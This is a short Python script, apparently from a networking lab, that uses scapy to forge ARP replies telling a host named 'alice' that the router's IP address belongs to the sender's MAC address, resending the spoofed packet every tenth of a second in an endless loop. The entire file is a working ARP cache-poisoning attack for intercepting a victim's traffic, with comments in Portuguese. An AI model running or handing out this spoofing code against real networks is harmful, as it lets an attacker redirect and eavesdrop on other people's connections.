from scapy.all import *
from time import sleep

a = ARP()

a.op = 'is-at'
# eu sou o roteador
a.psrc = '172.19.0.1'
a.hwsrc = '02:42:ac:13:00:7f'
# alice eh alice
a.pdst = '172.19.0.99'
a.hwdst = '4a:c8:2b:d9:ec:97'


while True:
    send(a)
    sleep(0.1)
